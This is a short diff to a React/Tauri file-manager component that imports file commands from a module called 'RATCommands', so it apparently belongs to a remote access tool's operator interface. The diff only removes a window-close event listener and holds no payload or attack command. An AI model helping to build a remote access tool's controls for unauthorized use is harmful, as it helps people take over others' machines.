@@ -2,7 +2,6 @@ import { useEffect, useState, useRef } from "react";
 import { useParams } from "react-router-dom";
 import { FileType } from "../../types";
 import { readFilesCmd, manageFileCmd } from "../rat/RATCommands";
-import { getCurrent } from "@tauri-apps/api/window";
 import { listen } from "@tauri-apps/api/event";
 import {
   IconFolderFilled,
@@ -38,22 +37,6 @@ export const FileManager = () => {
 
   const filesRef = useRef<HTMLDivElement>(null);
   const foldersRef = useRef<HTMLDivElement>(null);
-
-  useEffect(() => {
-    let cleanupFn: (() => void) | undefined;
-
-    let window = getCurrent();
-
-    listen("close_window", () => {
-      window.close();
-    }).then((unlisten) => {
-      cleanupFn = unlisten;
-    });
-
-    return () => {
-      if (cleanupFn) cleanupFn();
-    };
-  }, []);
 
   function fileActions(type: string, fileName: string) {
     if (type === "file")
